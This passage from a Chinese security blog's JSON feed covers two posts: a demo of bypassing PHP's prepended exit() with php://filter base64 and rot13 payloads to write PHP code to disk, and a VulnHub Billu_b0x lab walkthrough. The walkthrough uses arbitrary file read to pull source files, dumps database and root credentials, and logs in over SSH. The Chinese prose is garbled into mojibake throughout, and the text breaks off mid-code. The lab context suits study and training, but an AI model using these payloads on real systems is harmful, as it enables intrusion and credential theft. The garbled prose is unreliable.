/></p>\n<p>è¿™é‡Œåˆ©ç”¨çš„å°±æ˜¯è¿™ä¸ªæ–¹å¼</p>\n<p>demo</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$file</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$data</span><span class=\"token operator\">=</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'data'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n@<span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"&lt;?php exit();\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span>\n/*get:?file=php://filter/convert.base64-decode/resource=1.php\npost:APD9waHAgcGhwaW5mbygpOyA/Pg==\nè¿™é‡Œpostå‰è¦åŠ ä¸€ä¸ªå­—ç¬¦ï¼Œä»€ä¹ˆéƒ½è¡Œï¼Œå› ä¸ºbase64æ˜¯4ä¸ªå­—ç¬¦ä¸€èµ·è§£ç ï¼Œå‰é¢çš„phpexitæ˜¯7ä½ï¼Œå¦‚æœä¸è¡¥é½è§£ç ä¼šå°†åé¢çš„Dç®—ä¸Šï¼Œå¯¼è‡´è§£ç ä¸å‡ºé¢„æœŸç»“æœ\n*/<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221104204652019.png\" alt=\"image-20221104204652019\" /></p>\n<p>æˆåŠŸå†™å…¥ï¼Œåœ¨çŸ­æ ‡ç­¾æ²¡å¼€å¯çš„æƒ…å†µä¸‹è¿˜æœ‰ä¸€ç§æ–¹å¼</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">php<span class=\"token punctuation\">:</span><span class=\"token comment\">//filter/write=string.rot13/resource=</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p>ä½¿ç”¨æ–¹å¼ç›¸åŒè¿™é‡Œç®€å•çš„è¿‡ä¸€ä¸‹å³å¯</p>\n<p>æ¥ä¸‹æ¥è®°å½•ç¬¬äºŒç§æƒ…å†µ</p>\n<p>åœ¨è¿™ç§æƒ…å†µä¸‹å°±ä¸èƒ½å†ä½¿ç”¨ base64ï¼Œå› ä¸º base64 é‡åˆ° = å°±ç»ˆæ­¢äº†</p>\n<p><pre class=\"line-numbers language-none\"><code class=\"language-none\">data&#x3D;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;string.rot13|&lt;?cuc cucvasb(); ?&gt;|&#x2F;resource&#x3D;clown.php<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221104211913293.png\" alt=\"image-20221104211913293\" /></p>\n",
            "tags": [
                "Web",
                "ä¼ªåè®®"
            ]
        },
        {
            "id": "https://blog.xcu.icu/2022/11/04/VulnHub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Billu_b0x%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/",
            "url": "https://blog.xcu.icu/2022/11/04/VulnHub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Billu_b0x%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/",
            "title": "VulnHubé¶æœºå­¦ä¹ ",
            "date_published": "2022-11-03T16:00:00.000Z",
            "content_html": "<h2 id=\"vulnhubé¶æœºå­¦ä¹ billu_b0xå®æˆ˜è®°å½•\"><a class=\"anchor\" href=\"#vulnhubé¶æœºå­¦ä¹ billu_b0xå®æˆ˜è®°å½•\">#</a> VulnHub é¶æœºå­¦ä¹  â€”â€”Billu_b0x å®æˆ˜è®°å½•</h2>\n<h3 id=\"å‰è¨€\"><a class=\"anchor\" href=\"#å‰è¨€\">#</a> å‰è¨€</h3>\n<p>è¯´èµ·æ¥åº”è¯¥ç®—æ˜¯ç¬¬ä¸€æ¬¡æ‰“è¿™æ ·çš„é¶æœºï¼Œè™½ç„¶æ²¡æœ‰ç‹¬ç«‹å®Œæˆï¼Œä½†æ˜¯è¿˜æ˜¯å­¦åˆ°ä¸å°‘ä¸œè¥¿ï¼Œä¹Ÿä¸çŸ¥é“ç®—æ˜¯ä»€ä¹ˆéš¾åº¦çš„åæ­£æ˜¯çœ‹ç€ç½‘ä¸Šå¤§ä½¬çš„æ–¹æ³•æ‰“é€šäº†</p>\n<h3 id=\"é¶æœºè¯´æ˜\"><a class=\"anchor\" href=\"#é¶æœºè¯´æ˜\">#</a> é¶æœºè¯´æ˜</h3>\n<p>ç›®æ ‡æ˜¯è·å– root æƒé™</p>\n<p>ç¯å¢ƒä»‹ç»ï¼šæ”»å‡»æœº win10ã€kail Linux</p>\n<p>â€‹\t\t\t\t\té¶æœº billu_b0x (è¿è¡Œä¸ VMware ä¸­)</p>\n<p>ç½‘è·¯è®¾ç½®ï¼šVM ä¸­å‡ä¸º Nat è¿æ¥æ¨¡å¼ï¼ˆå¦åˆ™ nmap æ‰«ä¸åˆ°å­˜æ´»ä¸»æœºï¼‰</p>\n<h3 id=\"è¿‡ç¨‹è®°å½•\"><a class=\"anchor\" href=\"#è¿‡ç¨‹è®°å½•\">#</a> è¿‡ç¨‹è®°å½•</h3>\n<h4 id=\"ä¿¡æ¯æ”¶é›†\"><a class=\"anchor\" href=\"#ä¿¡æ¯æ”¶é›†\">#</a> ä¿¡æ¯æ”¶é›†</h4>\n<p>å¯åŠ¨é¶æœºè¿™ä¸å¿…å¤šè¯´</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220725200859598.png\" alt=\"image-20220725200859598\" /></p>\n<p>å…ˆç”¨ nmap æ‰«æï¼Œæ‰¾åˆ°è¿™ä¸ªé¶æœºçš„ ip åœ°å€</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220725201302238.png\" alt=\"image-20220725201302238\" /></p>\n<p>æ‰«æè¿™ä¸ªç½‘æ®µå­˜æ´»ä¸»æœº</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220725201148762.png\" alt=\"image-20220725201148762\" /></p>\n<p>å‘ç°å¼€æ”¾äº† 80 å’Œ 22 ç«¯å£ï¼Œé‚£ä¹ˆ ssh å’Œ http éƒ½æœ‰äº†å…ˆçœ‹çœ‹ 80 éƒ½æœ‰ä»€ä¹ˆ</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220725202635615.png\" alt=\"image-20220725202635615\" /></p>\n<p>çœ‹åˆ°ç™»å½•æ¡†ï¼Œä½†æ˜¯æ²¡æœ‰å‘ç° SQL æ³¨å…¥ï¼Œç”¨ dirsearch æ‰«æ</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220725202855639.png\" alt=\"image-20220725202855639\" /></p>\n<p>çœ‹åˆ°æ–‡ä»¶å¾ˆå¤šï¼Œå…ˆçœ‹çœ‹éƒ½æ˜¯å®ç°ä»€ä¹ˆåŠŸèƒ½çš„</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220725202956010.png\" alt=\"image-20220725202956010\" /></p>\n<p>add ä¸Šä¼ æ–‡ä»¶</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220725203042625.png\" alt=\"image-20220725203042625\" /></p>\n<p>head.php æ˜¯é¦–é¡µçš„èƒŒæ™¯å›¾ç‰‡</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220725203140837.png\" alt=\"image-20220725203140837\" /></p>\n<p>images æ˜¯ä¸‰å¼ å›¾ç‰‡æ²¡å‘ç°èƒ½åˆ©ç”¨çš„ä¸œè¥¿</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220725203252626.png\" alt=\"image-20220725203252626\" /></p>\n<p>phpmy æ˜¯ phpmyadmin æ•°æ®åº“å·¥å…·</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220725211429058.png\" alt=\"image-20220725211429058\" /></p>\n<p>in.php æ˜¯ phpinfoï¼ŒçŸ¥é“äº† php ç‰ˆæœ¬ï¼Œæš‚æ—¶æœªå‘ç°ä½œç”¨</p>\n<p>panel ä¼šè¢«é‡å®šå‘æš‚æ—¶ä¸çŸ¥é“æ˜¯ä»€ä¹ˆ</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220725203751630.png\" alt=\"image-20220725203751630\" /></p>\n<p>test æ–‡ä»¶æç¤ºï¼Œè¦ä¼ å‚ fileï¼Œæ„Ÿè§‰è¿™é‡Œå¯èƒ½ä¼šæœ‰ä»»æ„æ–‡ä»¶è¯»å– get ä¼ å‚æ²¡ååº”ï¼Œpost ä¼ å‚è¯»å– etc/password</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220725210934542.png\" alt=\"image-20220725210934542\" /></p>\n<p>è¯»å–æˆåŠŸï¼Œè¿™é‡Œå°è¯•è¯»å–å…¶ä»–æ–‡ä»¶</p>\n<h4 id=\"ä»»æ„æ–‡ä»¶è¯»å–åˆ©ç”¨\"><a class=\"anchor\" href=\"#ä»»æ„æ–‡ä»¶è¯»å–åˆ©ç”¨\">#</a> ä»»æ„æ–‡ä»¶è¯»å–åˆ©ç”¨</h4>\n<p>add.php</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'&lt;form  method=\"post\" enctype=\"multipart/form-data\">\n    Select image to upload:\n    &lt;input type=\"file\" name=image>\n\t&lt;input type=text name=name value=\"name\">\n\t&lt;input type=text name=address value=\"address\">\n\t&lt;input type=text name=id value=1337 >\n    &lt;input type=\"submit\" value=\"upload\" name=\"upload\">\n&lt;/form>'</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>c.phpï¼ˆé‡Œé¢å‘ç°æ•°æ®åº“çš„è´¦å·å¯†ç ï¼Œå¯ä»¥ä½¿ç”¨ï¼‰</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token comment\">#header( 'Z-Powered-By:its chutiyapa xD' );</span>\n<span class=\"token function\">header</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'X-Frame-Options: SAMEORIGIN'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">header</span><span class=\"token punctuation\">(</span> <span class=\"token string single-quoted-string\">'Server:testing only'</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">header</span><span class=\"token punctuation\">(</span> <span class=\"token string single-quoted-string\">'X-Powered-By:testing only'</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token function\">ini_set</span><span class=\"token punctuation\">(</span> <span class=\"token string single-quoted-string\">'session.cookie_httponly'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token variable\">$conn</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_connect</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"127.0.0.1\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"billu\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"b0x_billu\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"ica_lab\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">// Check connection</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">mysqli_connect_errno</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n  <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"connection failed ->  \"</span> <span class=\"token operator\">.</span> <span class=\"token function\">mysqli_connect_error</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>show.php</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'c.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'continue'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#123;</span>\n\t<span class=\"token variable\">$run</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'select * from users '</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token variable\">$result</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$conn</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$run</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">mysqli_num_rows</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$result</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;table width=90% >&lt;tr>&lt;td>ID&lt;/td>&lt;td>User&lt;/td>&lt;td>Address&lt;/td>&lt;td>Image&lt;/td>&lt;/tr>\"</span><span class=\"token punctuation\">;</span>\n <span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$row</span> <span class=\"token operator\">=</span> <span class=\"token function\">mysqli_fetch_assoc</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$result</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> \n   <span class=\"token punctuation\">&#123;</span>\n\t   <span class=\"token keyword\">echo</span> <span class=\"token string single-quoted-string\">'&lt;tr>&lt;td>'</span><span class=\"token operator\">.</span><span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'&lt;/td>&lt;td>'</span><span class=\"token operator\">.</span><span class=\"token function\">htmlspecialchars</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token constant\">ENT_COMPAT</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'&lt;/td>&lt;td>'</span><span class=\"token operator\">.</span><span class=\"token function\">htmlspecialchars</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'address'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token constant\">ENT_COMPAT</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'&lt;/td>&lt;td>&lt;img src=\"uploaded_images/'</span><span class=\"token operator\">.</span><span class=\"token function\">htmlspecialchars</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'image'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token constant\">ENT_COMPAT</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'\" height=90px width=100px>&lt;/td>&lt;/tr>'</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n   <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;/table>\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<h4 id=\"æ³•ä¸€sshè¿æ¥\"><a class=\"anchor\" href=\"#æ³•ä¸€sshè¿æ¥\">#</a> æ³•ä¸€ï¼Œssh è¿æ¥</h4>\n<p>å› ä¸ºå…¶ 22 ç«¯å£å¼€æ”¾ï¼Œè¯»å– PHP é»˜è®¤é…ç½®æ–‡ä»¶æ˜¯ config.inc.phpï¼ŒLinux ç³»ç»Ÿè·¯å¾„ç»“åˆ phpmyï¼Œ./phpmy/config.inc.php ç›´æ¥æŸ¥çœ‹è´¦æˆ·ä¿¡æ¯</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\n<span class=\"token comment\">/* Servers configuration */</span>\n<span class=\"token variable\">$i</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">/* Server: localhost [1] */</span>\n<span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$cfg</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'Servers'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'verbose'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'localhost'</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$cfg</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'Servers'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'host'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'localhost'</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$cfg</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'Servers'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'port'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$cfg</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'Servers'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'socket'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$cfg</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'Servers'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'connect_type'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'tcp'</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$cfg</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'Servers'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'extension'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'mysqli'</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$cfg</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'Servers'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'auth_type'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'cookie'</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$cfg</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'Servers'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'user'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'root'</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$cfg</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'Servers'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'roottoor'</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$cfg</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'Servers'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'AllowNoPassword'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">/* End of servers configuration */</span>\n\n<span class=\"token variable\">$cfg</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'DefaultLang'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'en-utf-8'</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$cfg</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'ServerDefault'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$cfg</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'UploadDir'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$cfg</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'SaveDir'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">''</span><span class=\"token punctuation\">;</span>\n\n\n<span class=\"token comment\">/* rajk - for blobstreaming */</span>\n<span class=\"token variable\">$cfg</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'Servers'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'bs_garbage_threshold'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">50</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$cfg</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'Servers'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'bs_repository_threshold'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'32M'</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$cfg</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'Servers'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'bs_temp_blob_timeout'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">600</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$cfg</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'Servers'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'bs_temp_log_threshold'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'32M'</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>\n<p>çœ‹åˆ° root çš„è´¦å·å¯†ç ç”¨ ssh è¿æ¥</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220725212737642.png\" alt=\"image-20220725212737642\" /></p>\n<h4 id=\"æ³•äºŒæ–‡ä»¶ä¸Šä¼ \"><a class=\"anchor\" href=\"#æ³•äºŒæ–‡ä»¶ä¸Šä¼ \">#</a> æ³•äºŒï¼Œæ–‡ä»¶ä¸Šä¼ </h4>\n<p>é€šè¿‡ä¸Šé¢æ‰¾åˆ°çš„è´¦å·å¯†ç ç™»å½• phpmyadmin</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220726101939920.png\" alt=\"image-20220726101939920\" /></p>\n<p>åœ¨ ica_lab çš„æ•°æ®åº“è¡¨ä¸­å¾—åˆ°çš„ç”¨æˆ·å biLLu å’Œå¯†ç  hEx_it</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220726102053357.png\" alt=\"image-20220726102053357\" /></p>\n<p>å»åœ¨é¦–é¡µç™»å½•</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20220726102217542.png\" alt=\"image-20220726102217542\" /></p>\n<p>è·³è½¬åˆ° panel é¡µé¢</p>\n<p><pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">session_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'c.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'head2.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>@<span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'logged'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">!=</span><span class=\"token constant boolean\">true</span> <span class=\"token punctuation\">)</span>\n<span class=\"token 